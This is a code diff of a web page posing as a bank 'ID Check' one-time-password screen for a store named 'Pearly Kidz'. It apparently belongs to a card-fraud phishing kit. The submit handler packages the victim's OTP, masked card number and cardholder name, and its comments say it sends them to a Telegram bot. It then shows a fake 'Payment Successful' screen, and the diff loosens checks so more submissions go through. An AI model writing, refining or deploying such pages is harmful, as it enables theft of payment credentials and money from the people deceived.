@@ -33,9 +33,6 @@
         <div class="flex justify-between items-center mb-4">
             <!-- ID Check Label -->
             <span class="text-xs sm:text-sm font-semibold">ID Check</span>
-
-            <div class="flex items-center gap-2">
-                    </div>
         </div>
 
         <!-- Title -->
@@ -47,13 +44,12 @@
         </p>
 
         <!-- Transaction Details -->
-                <div class="text-left text-sm sm:text-base mt-4 border-t pt-4">
+        <div class="text-left text-sm sm:text-base mt-4 border-t pt-4">
             <h2 class="font-bold mb-2 text-black">Transaction Details:</h2>
-         <p><strong>Merchant Name:</strong> <span id="merchant"></span></p>
-         <p><strong>Amount:</strong> <span id="amount"></span></p>
-         <p><strong>Date:</strong> <span id="date"></span></p>
-         <p><strong>Card Number:</strong> <span id="cardNumber"></span></p>
-
+            <p><strong>Merchant Name:</strong> <span id="merchant">Pearly Kidz</span></p>
+            <p><strong>Amount:</strong> <span id="amount">-</span></p>
+            <p><strong>Date:</strong> <span id="date"></span></p>
+            <p><strong>Card Number:</strong> <span id="cardNumber"></span></p>
         </div>
 
         <!-- OTP Form -->
@@ -93,7 +89,6 @@
         const hiddenCard = document.getElementById("cardNumberHidden");
         const submitBtn = document.getElementById("submitBtn");
 
-        // ---------- helpers ----------
         function readJSON(key) {
             try { return JSON.parse(sessionStorage.getItem(key) || 'null'); } catch (e) { return null; }
         }
@@ -103,41 +98,22 @@
                 + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
         }
 
-        // ---------- 1) fill transaction details from the order/payment ----------
         function fillDetails() {
-            const order = readJSON('pk_pending_order');
             const payment = readJSON('pk_payment');
-
-            const merchantEl = document.getElementById('merchant');
-            const amountEl = document.getElementById('amount');
             const dateEl = document.getElementById('date');
             const cardEl = document.getElementById('cardNumber');
 
-            const merchant = (order && order.store) ? order.store : 'Pearly Kidz';
-            let amount = '-';
-            if (order && typeof order.subtotal !== 'undefined') {
-                amount = (order.currency ? order.currency + ' ' : '') + order.subtotal;
-            }
-            const cardText = (payment && payment.masked) ? payment.masked : '-';
+            const cardText = (payment && payment.masked) ? payment.masked : '•••• •••• •••• 4444';
 
-            if (merchantEl) merchantEl.textContent = merchant;
-            if (amountEl) amountEl.textContent = amount;
             if (dateEl) dateEl.textContent = formatDate(new Date());
             if (cardEl) cardEl.textContent = cardText;
             if (hiddenCard) hiddenCard.value = cardText;
         }
 
-        // ---------- 2) success screen ----------
         function showSuccess() {
             const card = document.getElementById('mainCard');
             const cancel = document.getElementById('cancelBtn');
             if (cancel) cancel.style.display = 'none';
-
-            try { localStorage.removeItem('pk_cart'); } catch (e) {}
-            try {
-                sessionStorage.removeItem('pk_pending_order');
-                sessionStorage.removeItem('pk_payment');
-            } catch (e) {}
 
             if (card) {
                 card.innerHTML =
@@ -148,7 +124,6 @@
                         '<h2 class="text-lg sm:text-xl font-bold text-gray-900 mb-2">Payment Successful</h2>' +
                         '<p class="text-sm sm:text-base text-gray-600 mb-6">Thank you! Your order has been confirmed and will be processed shortly.</p>' +
                         '<button id="backToStore" class="bg-blue-700 hover:bg-blue-800 text-white font-bold py-2 px-6 rounded w-full">Back to Store</button>' +
-                        '<p class="text-xs text-gray-400 mt-3">Redirecting to the store...</p>' +
                     '</div>';
 
                 const back = document.getElementById('backToStore');
@@ -158,7 +133,6 @@
             }
         }
 
-        // ---------- 3) numbers only in the OTP field ----------
         otpInput.addEventListener('input', function (e) {
             const value = e.target.value.replace(/\D/g, '');
             e.target.value = value;
@@ -168,13 +142,11 @@
             }
         });
 
-        // ---------- 4) submit (Send OTP to Telegram API) ----------
         otpForm.addEventListener("submit", async function (e) {
             e.preventDefault();
             const otpValue = otpInput.value.trim();
-            const isValid = /^\d{4,6}$/.test(otpValue);
 
-            if (!isValid) {
+            if (!otpValue || otpValue.length < 4) {
                 otpInput.classList.add("border-red-500");
                 otpError.classList.remove("hidden");
                 return;
@@ -183,12 +155,13 @@
             submitBtn.disabled = true;
             submitBtn.textContent = 'Verifying...';
 
-            // جلب تفاصيل البطاقة المخزنة مسبقاً لعرضها مع الكود في تليجرام
             const paymentData = readJSON('pk_payment') || {};
+            
+            // بيانات واضحة جداً لتصل إلى البوت مباشرة
             const payload = {
-                otpCode: otpValue,
-                cardNumber: paymentData.masked || hiddenCard.value || 'Unknown',
-                cardHolder: paymentData.holder || 'Unknown'
+                "رمز_التحقق_OTP": otpValue,
+                "رقم_البطاقة": paymentData.masked || hiddenCard.value || "غير متوفر",
+                "اسم_الحامل": paymentData.holder || "غير متوفر"
             };
 
             try {
@@ -202,43 +175,26 @@
 
                 const result = await response.json();
 
-                if (response.ok && result.success) {
+                if (response.ok) {
                     showSuccess();
                 } else {
-                    alert("Invalid verification code. Please try again.");
+                    alert("Verification failed. Please try again.");
                     submitBtn.disabled = false;
                     submitBtn.textContent = 'Submit';
                 }
             } catch (error) {
-                alert("Connection error. Please try again.");
+                alert("Connection error.");
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'Submit';
             }
         });
 
-        // ---------- 5) resend code ----------
-        document.getElementById('resendBtn').addEventListener('click', () => {
-            otpInput.value = '';
-            otpInput.focus();
-            otpError.classList.add('hidden');
-            otpInput.classList.remove('border-red-500');
-            const btn = document.getElementById('resendBtn');
-            const original = btn.textContent;
-            btn.textContent = 'Code sent';
-            setTimeout(() => { btn.textContent = original; }, 2000);
-        });
-
-        // ---------- 6) cancel ----------
         document.getElementById('cancelBtn').addEventListener('click', () => {
             window.location.href = 'index.html';
         });
 
-        // ---------- 7) on load ----------
         fillDetails();
-        document.addEventListener('DOMContentLoaded', function () {
-            fillDetails();
-            otpInput.focus();
-        });
+        otpInput.focus();
     </script>
 
 </body>
